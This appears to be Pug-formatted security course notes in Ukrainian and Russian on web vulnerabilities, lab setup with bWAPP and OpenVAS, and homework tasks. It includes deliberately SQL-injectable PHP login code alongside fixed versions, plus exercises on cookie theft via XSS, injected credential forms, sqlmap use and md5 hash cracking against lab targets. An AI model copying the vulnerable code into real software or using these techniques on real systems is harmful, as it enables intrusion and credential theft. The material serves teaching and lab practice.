          Використовуючи цю вразливість, зловмисники можуть обійти стандартні функції захисту та отримати несанкціонований доступ до конфіденційної інформації або систем. 
        
          Детальніше про broken access
          https://medium.com/purplebox/broken-access-control-f82235ddf888
        
          Вразливості управліннями сесій
          * session Token Storage
          * Predictable tokens
          * JWT
          * Token disclosure
          * Cokkies flags
          * Cookie domain, path
          * Logout
          * Multiple sessions
          * Session fixation
          * Session expiration
          * Token Hijacking Mitigation
        
          Вразливості JWT токену
          * Failing to verify the signature
          * Allowing the None algorithm
          * Algorithm confusion
          * Using trivial secrets
          * kid parameter injections
          * Attacks using the jku header
        
          Різниця між cookie та JWT токенами
          📌 Вразливості JWT токену описані в
          https://www.invicti.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/
          https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
          https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities
        
          📌 Про різницю між cookie та JWT токенами
          https://medium.com/@prashantramnyc/difference-between-session-cookies-vs-jwt-json-web-tokens-for-session-management-4be67d2f066e
          https://developer.okta.com/blog/2022/02/08/cookies-vs-tokens
        
          Якщо коротко про різницю cookie та JWT токенами:
          * JWT, це шифрований user profile, який передають через клієнта, i потрібен він для: кластеризації за лоад-балансером, та авторизації, без звернення до бази/сервісу на кожен запит користувача.
          * Веб-токен JSON (JWT) — це відкритий стандарт, який визначає компактний i самодостатній спосіб безпечної передачі інформації між сторонами як об’єкт JSON. Цю інформацію можна перевірити та довіряти їй, оскільки вона має цифровий підпис. JWT можна підписати за допомогою секрету (з алгоритмом HMAC) або пари відкритих/приватних ключів за допомогою RSA або ECDSA.
        
          Декодер JWT
          https://jwt.io/
        
          Payloads_SecList
          https://github.com/danielmiessler/SecLists
        
          Payloads_oftheThings
          https://github.com/swisskyrepo/PayloadsAllTheThings
        
          Dynamic Application Security Testing (DAST)
          https://www.rapid7.com/fundamentals/dast/
        
          What is Dynamic Application Security Testing (DAST)
          https://www.opentext.com/what-is/dast
        
          HTTP methods: GET vs POST
          https://www.w3schools.com/tags/ref_httpmethods.asp
        
          Top 10 Web Application Security Risks
          https://owasp.org/www-project-top-ten/
        
          OWASP API top 10
          https://owasp.org/www-project-api-security/


          DNS-подмена, DNS-спуфинг (DNS spoofing) или отравление DNS-кэша (DNS Сache Poisoning) – это атака, во время которой некорректные данные внедряются в кэш DNS-преобразователя, то есть во временную базу данных операционной системы компьютера, в которой фиксируются недавние посещения некоторых веб-сайтов и доменов Интернет.
          После незаконного получения контроля над DNS-информацией жертвы злоумышленник может вносить в нее несанкционированные изменения. Такая ситуация носит название захвата домена (Domain Hijacking).
          Самым распространенным способом похищения доменного имени является изменение контактной электронной почты администратора, для этого используются методы социальной инженерии или излом учетной записи электронной почты администратора.
          Унифицированный указатель ресурса (URL, Uniform resource location) – это уникальный идентификатор для поиска определенного ресурса в сети Интернет. Перенаправление URL-адреса обычно является легитимным.
          К примеру, вы вошли на портал электронного обучения, чтобы начать курс Cybersecurity Essentials. Если вы выйдете из портала и вернетесь на него в другой раз, портал перенаправит вас обратно на страницу входа. 
          Конкретно таковой тип функциональности могут употреблять злоумышленники. Вместо того чтобы перенаправить вас на страницу входа электронного портала, они могут направить вас на вредоносный сайт.
          Для надлежащего функционирования сети необходимы и используются многие базовые технические службы, в частности, маршрутизация, адресация и именование доменов. Они являются основными целями при выполнении атак.
          Подмена (Spoofing) или отравление (Poisoning) – это атака путем Перевоплощения (имперсонификации), которая происходит за счет использования доверительных отношений между двумя системами.
          Подмена MAC-адреса производится в случае, когда злоумышленник маскирует свое устройство под реальное устройство сети и соответственно может обойти процесс аутентификации.
          При ARP-спуфинге через локальную сеть осуществляется отправка поддельных сообщений протокола ARP.
          При IP-спуфинге с целью маскировки осуществляется отправка IP-пакетов с подмененным адресом отправителя
          Сетевые устройства, подключаемые к сетевому коммутатору, для передачи и получения данных используют коммутацию пакетов. MAC Flooding компрометирует данные, передаваемые определенному устройству. Злоумышленник посылает в сеть большое количество сообщений с поддельными MAC-адресами, компрометируя безопасность сетевого коммутатора.
          В сети, подключенной к Интернету, DoS-атака вызывает проблемы с передачей данных за счет либо отправки сверхбольшого количества данных, либо отправки некорректно отформатированных пакетов, которые сеть не может обработать.
          DDoS-атака является результатом работы бот-сети инфицированных узлов, так называемых зомби-агентов. По готовности злоумышленник может подать команду системе управления ботнетом к началу DDoS-атаки.
          Атаки канального уровня (Layer 2 attacks) направлены в обход протоколов аутентификации на канальный уровень модели OSI, обеспечивающей передачу данных через физическую сеть 
          DNS-атаки направлены на уязвимость системы доменных имен и могут привести к непредсказуемой ее работе.
          Мошенническая точка доступа (Rogue Access Points) – это точка доступа, установленная без разрешения в защищенной сетевой инфраструктуре. Подключаюсь к сети. Беру МАС настоящего роутера себе.
          Атака "Злой двойник" (Evil Twin Attack) описывает ситуацию, когда точка доступа злоумышленника настроена так, чтобы выглядеть как лучший вариант подключения. После подключения пользователей к этой точке доступа злоумышленник может анализировать сетевой трафик и выполнить MitM-атаки.
          
          <dfn>Социальная инженерия</dfn> – это манипулирование лицом для побуждения его к выполнению определенных действий или разглашению конфиденциальной информации.<br>
          Атака вишинга, также известная как голосовой фишинг (Voice phishing), заключается в том, что злоумышленники используют технологии голосовой связи, чтобы побуждать пользователей разглашать определенную персональную информацию, например данные кредитной карты.
          Злоумышленники могут подменять телефонные звонки, осуществляемые с помощью протокола передачи голосовых сообщений через Интернет (VoIP, Voice over Internet Protocol), или оставить записанные сообщения для создания впечатления, что они являются легальными абонентами.
          Фарминг (Pharming) При атаке такого типа осуществляется умышленное перенаправление пользователя на поддельную версию официального веб-сайта. Поверив, что соединение выполнено на легальном веб-сайте, пользователь вводит свои учетные данные на мошенническом веб-сайте.
          Уэллинг, дословно охота на китов – это фишинговая атака целью которой являются высокопоставленные лица, в частности, топ-менеджеры организаций, политики, известные личности.
          Смешинг (SMiShing, Short Message Service phishing) – одна из тактик, которую злоумышленники используют для обмана пользователей. Поддельные текстовые сообщения побуждают пользователя посетить вредоносный веб-сайт или позвонить по телефону мошенника, что может привести к загрузке на устройство вредоносного программного обеспечения или к распространению личной информации.

          Cryptojacking (криптоджекинг) — тип кибератаки, который используется для получения криптовалюты.<br>
          crystalblockchain.com
          amlbot.com
          coinmarketcap
      
      //- encoded & hashing & ssh
      details
        summary encoded & hashing & ssh
        p.

          Завдання 1
        
          Це завдання має на меті отримати навички у декодуванні даних з base64. Також за допомогою утиліти file ви зможете дізнатись тип файлу. 
        
          Детальніше про магічні байти та як їх використовувати для атак можна почитати за посиланням 
          https://medium.com/@d.harish008/what-is-a-magic-byte-and-how-to-exploit-1e286da1c198
        
          * З текстового файлу відновити закодовані дані за допомогою команди base64, зберегти декодований вивід у файл. 
          * За допомогою команди file дізнатись що це за тип файлу. 
          * Відкрити декодований файл та надіслати фразу з кінцевого файлу – encoded.txt
        
          Завдання 2
        
          Це завдання імітує відтворення паролей з їх хешів за допомогою словника. 
        
          В якості алгоритму хешування виступає md5, який є застарілим та ненадійним. З сучасними алгоритмами хешування послідовність дій така ж сама, але обчислення займає набагато більше ресурсів, тому для демонстраційних цілей було обрано саме цей алгоритм.
        
          * Під час роботи з сайтом ви знайшли SQL-ін'єкцію. З цією вразливістю ви здампили таблицю users:
          +----+---------------+----------------------------------+
          | id | name          | password                         |
          +----+---------------+----------------------------------+
          |  1 | administrator | 2298e5616f2a76c2e7a86cef305a8f0c |
          |  2 | alicethefox   | 2e07a0bc2e80b76362cd738cf623a055 |
          |  3 | miketheminion | 6adeb5f54399cec7a7178e2d48adee94 |
          |  4 | sarahtheswan  | fa7667f3d3ebae421dbe05b988ac9b85 |
          |  5 | maxthemouse   | 43e0ab313ea599d05161f324cb5e038e |
          |  6 | lucythelion   | 8990559f2a374dac882527a86b2f6973 |
          |  7 | bobbythebear  | c3669daebe306fd8ce43643ce7aa3ae9 |
          |  8 | oliviatheowl  | 19570fa38b775a52176561f8f70965d1 |
          |  9 | rockythedog   | 316c33c6da18457d597efbcc3d33656d |
          | 10 | rosiethecat   | 0062e6ff5b471a4cb65ade906ca42049 |
          +----+---------------+----------------------------------+
          * Відновіть їх паролі за допомогою утиліти hashcat або john the ripper. 
          * В якості словника використовуйте rockyou
          https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
        
        
          Завдання 3
          У цьому завданні ви маєте ознайомитись з різними режимами в hashcat та зрозуміти що таке сіль і як вона працює при хешуванні.
        
          * Під час роботи з сайтом ви змогли здампити таблицю з бази даних:
          +----+---------------+----------------------------------+
          | id | name          | password                         |
          +----+---------------+----------------------------------+
          |  1 | administrator | 0f47165ddcd57bc81ab4c29f65f08c9e |
          |  2 | alicethefox   | 11a8b07ace8168c8630e529d7587b819 |
          |  3 | miketheminion | dc0ea26b7ce1e625d8202a4ca06136cd |
          |  4 | sarahtheswan  | d5bbca88a42402c1bfb29c22f586bf86 |
          |  5 | maxthemouse   | dfc788fa0d055f8e2a054e31a7b1fd34 |
          |  6 | lucythelion   | 70f2c284db6ec5c721473702193cf49e |
          |  7 | bobbythebear  | dfff7f44f820f2830308dd294233ad4d |
          |  8 | oliviatheowl  | 5a5c4f5f71b69dd071238bf5833a30ec |
          |  9 | rockythedog   | 080684243d95f14ba9dc64a93f04076c |
          | 10 | rosiethecat   | a37f32f41049a377795d106a4d5fd3ae |
          +----+---------------+----------------------------------+
          * Також в ході роботи з додатком ви змогли знайти наступний фрагмент коду:
          $password_salt="secureSalt###221";
        
          * Чи можете ви відтворити паролі цих користувачів? 
          * В якості словника використовуйте rockyou
          https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
        
          Завдання 4
          Зробіть пошук одного з ваших паролів у rockyou.txt, для цього скористуйтесь:
          cat rockyou.txt | grep mypassword
        
          Завдання 5
          * Створити пару ключів в SSH
          ssh-keygen -t rsa -C "mykey" -b 4096
        img(src="./img/web/Coding.png" alt="")
        img(src="./img/web/Hash.png" alt="")
        img(src="./img/web/Hash_.png" alt="")
        br
        p.
          bwapp & OpenVAS
          Інструкція по встановленню bwapp
          Встановлення bwapp (Bee-box VM installation)
          Завантажити, розпакувати та імпортувати вразливий додаток:
          https://download.vulnhub.com/bwapp/bee-box_v1.6.7z
        
          Змініть мережевий інтерфейс на Host-only
          В машині Kali Linux додайте ще один мережевий інтерфейс такого ж типу host-only adapter
        
          Запустіть імпортовану машину. Має завантажитись система.
        
          Відкрийте термінал та введіть команду ifconfig. Так ви дізнаєтесь ip адресу у host-only мережі.
        
          Далі з Kali машині перейдіть за цією адресою у браузері:
          Оберіть опцію bwapp. Авторизуйтесь за допомогою логіну bee та паролю bug.
          Встановлення openvas сканера:
          sudo apt update && sudo apt upgrade && sudo apt dist-upgrade
          sudo apt install openvas
          sudo gvm-setup
          *Займе багато часу
          sudo gvm-start
        
          Помилки при розгортанні bWAPP на віртуальній машині
          При розгортанні bWAPP на віртуальній машині за допомогою архіву (https://sourceforge.net/projects/bwapp/files/bWAPP/) на останніх версіях PHP може не працювати певний функціонал bWAPP (при виборі вразливості будуть відображатись пусті веб-сторінки).
          У такому випадку можна скачати готовий образ віртуальної машини за посиланням.
          https://sourceforge.net/projects/bwapp/files/bee-box/
        
          Даний образ розрахований на використання із ПЗ для віртуалізації VMWare (Workstation Player/Pro, Fusion) тому для імпорту цієї ВМ у VirtualBox спочатку потрібно її конвертувати у відповідний формат, який підтримується VirtualBox (.ovf).
        
          Для цього можна використати тулзу OVFTool (https://developer.vmware.com/web/tool/ovf/). Є версії як для Віндовз так і для Лінукс
          Після встановлення потрібно виконати наступну команду:
          * Якщо ovftool встановлено на Linux
          > ovftool /bee-box/bee-box.vmx ~/bee-box/bee-box.ovf
        
          * Якщо ovftool встановлено на Windows
          C:\Users\demo>C:\path\to\ovftool\ovftool.exe C:\bee-box\bee-box.vmx C:\bee-box\bee-box.ovf
        
          Потрібно правильно вказати шляхи до .vmx файлу. Далі імпортувати отриманий .ovf  файл у VirtualBox.
        
          Сканер OpenVAS. Помилки під час встановлення
          Після встановлення GVM(OpenVAS) по командам, які вказані у інструкції вище, а саме:
          sudo apt update && sudo apt upgrade && sudo apt dist-upgrade
          sudo apt install openvas
          sudo gvm-setup
          sudo gvm-start
        
          Далі при запуску сканера можлива поява помилок.
          Один із шляхів вирішення:
          sudo gvm-check-setup
          sudo runuser -u postgres -- /usr/share/gvm/create-postgresql-database
          sudo pg_lsclusters
          sudo apt install postgresql-16-pg-gvm
          sudo gvm-setup
        
          Таке можливо, якщо ви встановлювали openvas під користувачем root, а не шляхом використання sudo для поточного користувача у системі.
          Потрібно превірити овнера на файл /var/log/gvm/openvas.log, виконавши наступну команду:
          ls -la /var/log/gvmls -la /var/log/gvm
          Якщо там user/group owner root, то потрібно змінити на _gvm, виконавши наступну команду:
          sudo chown _gvm:_gvm /var/log/gvm/openvas.log
          Та перевірити, що овнер змінився:
          ls -la /var/log/gvm
          Після цього GVM (OpenVAS) повинен стартувати.
        
          Проблема 3: Failed to find config 'daba56c8-73ec-11df-a475-002264764cea
          Після встановлення сканера повинна пройти оновлення та синхронізація бази його сигнатур. Тому потрібно просто почекати ~30 хвилин так спробувати запускати скан знову.
        img(src="./img/web/Scan.png" alt="")
      
      //- Cryptographic Failures
      details
        summary Cryptographic Failures
        img(src="./img/web/RSA.png" alt="")
        img(src="./img/web/Шифр.png" alt="")
        img(src="./img/web/СиметрШифр.png" alt="")
        img(src="./img/web/АсиметрШифр.png" alt="")

      //- Injection
      details
        summary XML injection

        //- SQL injection
        details
          summary SQL injection
          p.
            SQL-инъекция - в поле ввода SQL-запрос
            Для запуску сервісу баз даних mysql
            systemctl start mysql
            
            Для запуску сервера apache2
            systemctl start apache2.service
            
            Для входу в додаток як адміністратор
            sudo mysql
            
            Створюємо нового користувача від імені якого будемо проводити маніпуляції з базою даних
            CREATE USER 'sqluser'@'localhost' IDENTIFIED BY 'new_password';
            CREATE DATABASE service;
            GRANT ALL PRIVILEGES ON `service`.* TO 'sqluser'@'localhost';
            FLUSH PRIVILEGES;
            
            Заходимо в базу даних щойно створеним акаунтом
            mysql -u sqluser -p
            new_password
            
            Перевіряємо чи доступна нам база даних service
            SHOW databases;
            USE service;
            
            Створюємо нову таблицю з користувачами
            CREATE TABLE service.user (
                id INT PRIMARY KEY,
                name VARCHAR(255),
                password VARCHAR(255)
            );
            
            Перевіряємо чи створилась таблиця
            show tables;
            
            Заповнюємо таблицю тестовими даними
            INSERT INTO service.user (id, name, password)
            VALUES
                (1, 'John', 'anypassword'),
                (2, 'Jane', 'secretpass'),
                (3, 'Mike', 'mypassword'),
                (4, 'Sarah', 'password123'),
                (5, 'David', 'pass123'),
                (6, 'Emily', 'abc123'),
                (7, 'Alex', 'qwerty'),
                (8, 'Olivia', 'letmein'),
                (9, 'Daniel', 'welcome'),
                (10, 'Sophia', 'testing');
            
            Перевіряємо чи створились дані
            select * from user;
            
            Вміст файлу index.php
            <?php
            // Database credentials
            $servername = "localhost";
            $username = "sqluser";
            $password = "new_password";
            $dbname = "service";
            
            // Create a database connection
            $conn = new mysqli($servername, $username, $password, $dbname);
            
            // Check if the connection was successful
            if ($conn->connect_error) {
                die("Connection failed: " . $conn->connect_error);
            }
            
            // Check if the login form was submitted
            if ($_SERVER["REQUEST_METHOD"] === "POST") {
                // Get the submitted username and password
                $enteredUsername = $_POST["username"];
                $enteredPassword = $_POST["password"];
            
                // Query to check if the user exists
                $sql = "SELECT * FROM `user` WHERE name = '" . $enteredUsername . "' AND password = '" . $enteredPassword . "'";
            
                // Execute the query
                $result = $conn->query($sql);
            
                // Check if a row was returned
                if ($result->num_rows > 0) {
                    // User exists, display success message
                    echo "Welcome, " . $enteredUsername;
                } else {
                    // User doesn't exist, display error message
                    echo "Wrong credentials";
                }
            }
            
            // Close the database connection
            $conn->close();
            ?>
            
            <.!DOCTYPE html>
            <.html>
            <.head>
                <.title>Login<./title>
            <./head>
            <.body>
                <.h1>Login<./h1>
                <.form method="post" action="<?php echo $_SERVER["PHP_SELF"]; ?>">
                    <.label for="username">Username:<./label>
                    <.input type="text" id="username" name="username" required>
            
                    <.label for="password">Password:<./label>
                    <.input type="text" id="password" name="password" required>
            
                    <.input type="submit" value="Login">
                <./form>
            <./body>
            <./html>
            
            Вміст файлу index2.php
            <?php
            error_reporting(E_ALL);
            ini_set('display_errors', '1');
            // Database credentials
            $servername = "localhost";
            $username = "sql";
            $password = "password";
            $dbname = "test";
            
            // Create a database connection
            $conn = new mysqli($servername, $username, $password, $dbname);
            
            // Check if the connection was successful
            if ($conn->connect_error) {
                die("Connection failed: " . $conn->connect_error);
            }
            
            // Check if the login form was submitted
            if ($_SERVER["REQUEST_METHOD"] === "POST") {
                // Get the submitted username and password
                $enteredUsername = $_POST["username"];
                $enteredPassword = $_POST["password"];
            
                // Query to check if the user exists
                $sql = "SELECT * FROM `user` WHERE name = '" . $enteredUsername . "' AND password = '" . $enteredPassword . "'";
            
                // Execute the query
                $result = $conn->query($sql);
            
                // Check for SQL error
                if (!$result) {
                    // Display the specific error message
                    echo "SQL Error: " . mysqli_error($conn);
                } else {
                    // Check if a row was returned
                    if ($result->num_rows > 0) {
                        // User exists, display success message
                        echo "Welcome, " . $enteredUsername;
                    } else {
                        // User doesn't exist, display error message
                        echo "Wrong credentials";
                    }
                }
            }
            
            // Close the database connection
            $conn->close();
            ?>
            
            <.!DOCTYPE html>
            <.html>
            <.head>
                <.title>Login<./title>
            <./head>
            <.body>
                <.h1>Login<./h1>
                <.form method="post" action="<?php echo $_SERVER["PHP_SELF"]; ?>">
                    <.label for="username">Username:<./label>
                    <.input type="text" id="username" name="username" required>
                    <.label for="password">Password:<./label>
                    <.input type="text" id="password" name="password" required>
            
                    <.input type="submit" value="Login">
                <./form>
            <./body>
            <./html>
            
                index3.php
            <?php
            // Database credentials
            $servername = "localhost";
            $username = "sqluser";
            $password = "new_password";
            $dbname = "service";
            
            // Create a database connection
            $conn = new mysqli($servername, $username, $password, $dbname);
            
            // Check if the connection was successful
            if ($conn->connect_error) {
                die("Connection failed: " . $conn->connect_error);
            }
            
            // Check if the login form was submitted
            if ($_SERVER["REQUEST_METHOD"] === "POST") {
                // Get the submitted username and password
                $enteredUsername = sanitizeInput($_POST["username"]);
                $enteredPassword = sanitizeInput($_POST["password"]);
            
                // Prepare the SQL statement using a prepared statement
                $stmt = $conn->prepare("SELECT * FROM `user` WHERE name = ? AND password = ?");
                $stmt->bind_param("ss", $enteredUsername, $enteredPassword);
                $stmt->execute();
            
                // Fetch the result
                $result = $stmt->get_result();
            
                // Check if a row was returned
                if ($result->num_rows > 0) {
                    // User exists, display success message
                    echo "Welcome, " . $enteredUsername;
                } else {
                    // User doesn't exist, display error message
                    echo "Wrong credentials";
                }
            
                // Close the statement
                $stmt->close();
            }
            
            // Close the database connection
            $conn->close();
            
            // Function to sanitize user input
            function sanitizeInput($input) {
                // Remove leading and trailing whitespaces
                $input = trim($input);
                
                // Define a regular expression pattern to allow only alphanumeric characters and spaces
                $pattern = "/^[a-zA-Z0-9 ]*$/";
            
                // Check if the input matches the pattern
                if (!preg_match($pattern, $input)) {
                    die("You cannot use special characters in the field: " . $input);
                }
            
                return $input;
            }
            
            ?>
            
            <.!DOCTYPE html>
            <.html>
            <.head>
                <.title>Login<./title>
            <./head>
            <.body>
                <.h1>Login<./h1>
                <.form method="post" action="<?php echo $_SERVER["PHP_SELF"]; ?>">
                    <.label for="username">Username:<./label>
                    <.input type="text" id="username" name="username" required>
            
                    <.label for="password">Password:<./label>
                    <.input type="password" id="password" name="password" required>
            
                    <.input type="submit" value="Login">
                <./form>
            <./body>
            <./html>
            
            index4.php
            <?php
            // Database credentials
            $servername = "localhost";
            $username = "sqluser";
            $password = "new_password";
            $dbname = "service";
            
            // Create a database connection
            $conn = new mysqli($servername, $username, $password, $dbname);
            
            // Check if the connection was successful
            if ($conn->connect_error) {
                die("Connection failed: " . $conn->connect_error);
            }
            
            // Check if the login form was submitted
            if ($_SERVER["REQUEST_METHOD"] === "POST") {
                // Get the submitted username and password
                $enteredUsername = sanitizeInput($_POST["username"]);
                $enteredPassword = sanitizeInput($_POST["password"]);
            
                // Prepare the SQL statement using a prepared statement
                $stmt = $conn->prepare("SELECT * FROM `user` WHERE name = ? AND password = ?");
                $stmt->bind_param("ss", $enteredUsername, $enteredPassword);
                $stmt->execute();
            
                // Fetch the result
                $result = $stmt->get_result();
            
                // Check if a row was returned
                if ($result->num_rows > 0) {
                    // User exists, display success message
                    echo "Welcome, " . htmlentities($enteredUsername, ENT_QUOTES, 'UTF-8');
                } else {
                    // User doesn't exist, display error message
                    echo "Wrong credentials";
                }
            
                // Close the statement
                $stmt->close();
            }
            
            // Close the database connection
            $conn->close();
            
            // Function to sanitize user input
            function sanitizeInput($input) {
                // Remove leading and trailing whitespaces
                $input = trim($input);
                
                // Disallow certain HTML tags
                $input = strip_tags($input);
            
                // Define a regular expression pattern to allow only alphanumeric characters and spaces
                $pattern = "/^[a-zA-Z0-9 ]*$/";
            
                // Check if the input matches the pattern
                if (!preg_match($pattern, $input)) {
                    die("You cannot use special characters in the field: " . $input);
                }
            
                return $input;
            }
            ?>
            
            <.!DOCTYPE html>
            <.html>
            <.head>
                <.title>Login<./title>
            <./head>
            <.body>
                <.h1>Login<./h1>
                <.form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"], ENT_QUOTES, 'UTF-8'); ?>">
                    <.label for="username">Username:<./label>
                    <.input type="text" id="username" name="username" required>
            
                    <.label for="password">Password:<./label>
                    <.input type="password" id="password" name="password" required>
            
                    <.input type="submit" value="Login">
                <./form>
            <./body>
            <./html>
            
            Для автоматизації пошуку вразливостей
            sqlmap -r req.txt  --batch
            
            Reverse shell cheat sheet
            https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
            
            Інструмент, який полегшує створення Reverse Shell
            https://www.revshells.com/
            
            Корисні матеріали до SQL
            https://websec.ca/kb/sql_injection#MySQL_Reading_Files
            
            Завдання 1
            
            * За допомогою sqlmap проексплуатуйте ін'єкції в bWAPP у задачах "SQL Injection- Blind -Time-based", "SQL Injection- Blind-Boolean-based". 
            * Прикріпіть скріншоти, на яких видно з якими параметрами ви запускали sqlmap та список існуючих таблиць в базі.

          img(src="./img/web/SQL inj.png" alt="")
          img(src="./img/web/HTMLinj.png" alt="")
          img(src="./img/web/SSTI1.png" alt="")
          img(src="./img/web/SSTI2.png" alt="")
          a(href="https://book.hacktricks.xyz/pentesting-web/sql-injection") sql-injection <br>
          a(href="https://portswigger.net/web-security/sql-injection") sql-injection

        //- PHP injection
        details
          summary PHP injection

        //- XML injection
        details
          summary XML injection

        //- DLL injection
        details
          summary DLL injection
          p.
            Файл библиотеки динамических ссылок (DLL, Dynamic Link Library ) – это файл-библиотека, содержащая код и данные, необходимые для выполнения определенных действий в ОС Windows. необходимы для выполнения того или иного действия.
            DLL-инъекция позволяет киберпреступнику обманом заставить приложение вызвать вредоносный файл DLL и выполнить его как часть процесса-жертвы.
              
      //- XSS & ХХЕ
      details
        summary XSS & ХХЕ
        p.
          What is cross-site scripting (XSS)
          https://portswigger.net/web-security/cross-site-scripting
        
          Поради по скануванню XSS вразливості
          https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
        
          Завдання 1
          * Оберіть рівень складності low та перейдіть до задачі HTML injection GET. 
          * За допомогою html injection зробіть форму авторизації на сторінці. Ви маєте додати на сторінку форму з полями вводу логін та пароль а також кнопку, при натисканні на яку буде відправлятись запит на http://127.0.0.1/listener
          * Запустіть вебсервер, наприклад за допомогою команди python3 -m http.server 88 Продемонструйте, що на ваш сервер йде запит з вашої форми.
        
          Завдання 2
          * Оберіть рівень складності low та завдання XSS Reflected GET.
          * За допомогою ін'єкції XSS відправте значення кукі PHPSESSID на ваш сервер та додайте скріншот, де її значення приходить на ваш сервер.
        
          Завдання 3
          * Встановіть сканер openvas. 
          * Проскануйте bwapp хост за допомогою цього сканеру у режимі "Full and fast". 
          * Зробіть експорт знайдених вразливостей та додайте цей файл до дз.
        
          Завдання 4
          На основі даних з завдання №3 аргументуйте чому не можна розгортати цю систему не у приватній(закритій) мережі?
        
          Завдання 2
        
          * Надайте порівняльну характеристику атак типу XSS та SQL injection: що в них спільного, та чим відрізняються (причина/причини виникнення, методи усунення, на кого направлені). 
          * Не використовуйте готовий копіпаст з вікіпедії/ChatGPT
        
          Завдання 3
        
          * В bWAPP зробіть завдання Cross-site-scripting POST та Cross-site-scripting User-Agent. 
          * Ваша ціль вивести попап (alert) зі значенням поточного домену. 
          * Додайте скріншот з алертом та прикріпіть пейлоад, який викликав його спрацювання.
        
          етальніше про ХХЕ
          https://portswigger.net/web-security/xxe
        
          Як захиститись від ХХЕ (Prevention Cheat Sheet)
          https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

          Межсайтовый скриптинг (XSS, Cross-Site Scripting) – это распространенная уязвимость, которая встречается во многих веб-приложениях. Вот как это работает:
          Киберпреступники используют XSS-уязвимость, включая в веб-страницы сценарии, содержащие вредоносный код.
          Жертва открывает веб-страницу и злонамеренные скрипты скрыто передаются в ее браузер. 
          Вредоносный скрипт может получить доступ к любым файлам cookie, сессионным токенам или другой конфиденциальной информации о пользователе, и эти данные отправляются киберпреступнику.
          Получив эту информацию, киберпреступник может выдавать себя за пользователя.
        
        img(src="./img/web/DOMXSS.png" alt="")
        img(src="./img/web/enum.png" alt="")
        img(src="./img/web/enum_.png" alt="")
        img(src="./img/web/enum__.png" alt="")
        img(src="./img/web/RefXSS.png" alt="")
        img(src="./img/web/StoXSS.png" alt="")
        img(src="./img/web/XSS.png" alt="")
        img(src="./img/web/XSS_.png" alt="")
        img(src="./img/web/XXE.png" alt="")
        img(src="./img/web/XXE_.png" alt="")
        img(src="./img/web/XXE___.png" alt="")
      
      //- SSTI
      details
        summary SSTI
        p.
          Методолія Server side template injection
          https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

          Корисні Payloads для роботи з SSTI
          https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
      
      //- CSRF
      details
        summary CSRF
        p.
          Подделка межсайтовых запросов (CSRF, Cross-Site Request Forgery) – это случай злонамеренного использования веб-сайта, при котором из браузера пользователя в надежное веб-приложение передаются несанкционированные команды.
          Злонамеренный веб-сайт может передавать такие команды с помощью специально созданных тегов изображений, скрытых форм или JavaScript-запросов – все они могут работать без ведома пользователя.
        img(src="./img/web/CSRF.png" alt="")
      
      //- Identification and Authentication Failures
      details
        summary Identification and Authentication Failures
        img(src="./img/web/API.png" alt="")
        img(src="./img/web/API1.png" alt="")
        img(src="./img/web/API2.png" alt="")
        img(src="./img/web/API3.png" alt="")
        img(src="./img/web/API4.png" alt="")
        img(src="./img/web/APISec.png" alt="")
        img(src="./img/web/DIR.png" alt="")
        img(src="./img/web/DIR_.png" alt="")
        img(src="./img/web/DIR___.png" alt="")
        img(src="./img/web/JWT.png" alt="")
        img(src="./img/web/JWT_.png" alt="")
        img(src="./img/web/OAuth.png" alt="")
        img(src="./img/web/PKI.png" alt="")
        img(src="./img/web/SSO.png" alt="")

      //- SSRF
      details
        summary Server-Side Request Forgery
        p.
          Server-Side Request Forgery (SSRF) опис та протидія
          https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
        
          Корисні Payloads для роботи з SSRF_1
          https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
        
          Корисні Payloads для роботи з SSRF_2
          https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
        
          How AWS Instance Metadata Service Version 2 works
          https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html
        img(src="./img/web/attack.png" alt="")
        img(src="./img/web/SSRF1.png" alt="")
        img(src="./img/web/SSRF2.png" alt="")
        img(src="./img/web/SSRF3.png" alt="")
        img(src="./img/web/SSRF4.png" alt="")
        img(src="./img/web/SSRF5.png" alt="")
        img(src="./img/web/Sec/Sec1.png" alt="")
        img(src="./img/web/Sec/Sec2.png" alt="")
        img(src="./img/web/Sec/Sec3.png" alt="")
        img(src="./img/web/Sec/Sec4.png" alt="")
        img(src="./img/web/Sec/Sec5.png" alt="")
        img(src="./img/web/Sec/Sec6.png" alt="")
        img(src="./img/web/Sec/Sec7.png" alt="")
        img(src="./img/web/Sec/Sec8.png" alt="")
        img(src="./img/web/Sec/Sec9.png" alt="")
        img(src="./img/web/Sec/Sec10.png" alt="")
        img(src="./img/web/Sec/Sec11.png" alt="")
        img(src="./img/web/Sec/Sec12.png" alt="")
        img(src="./img/web/Sec/Sec13.png" alt="")
        img(src="./img/web/Sec/Sec14.png" alt="")
        img(src="./img/web/Sec/Sec15.png" alt="")
        img(src="./img/web/Sec/Sec16.png" alt="")
        img(src="./img/web/Sec/Sec17.png" alt="")
        img(src="./img/web/Sec/Sec18.png" alt="")
        img(src="./img/web/Sec/Sec19.png" alt="")
        img(src="./img/web/Sec/Sec20.png" alt="")
        img(src="./img/web/Sec/Sec21.png" alt="")
        img(src="./img/web/Sec/Sec22.png" alt="")
        img(src="./img/web/Sec/Sec23.png" alt="")
        img(src="./img/web/Sec/Sec24.png" alt="")
        img(src="./img/web/Sec/Sec25.png" alt="")
        img(src="./img/web/Sec/Sec26.png" alt="")
        img(src="./img/web/Sec/Sec27.png" alt="")
        img(src="./img/web/Sec/Sec28.png" alt="")
        img(src="./img/web/Sec/Sec29.png" alt="")
        img(src="./img/web/Sec/Sec30.png" alt="")

    //- Етапи
    details
      summary Етапи
      p.
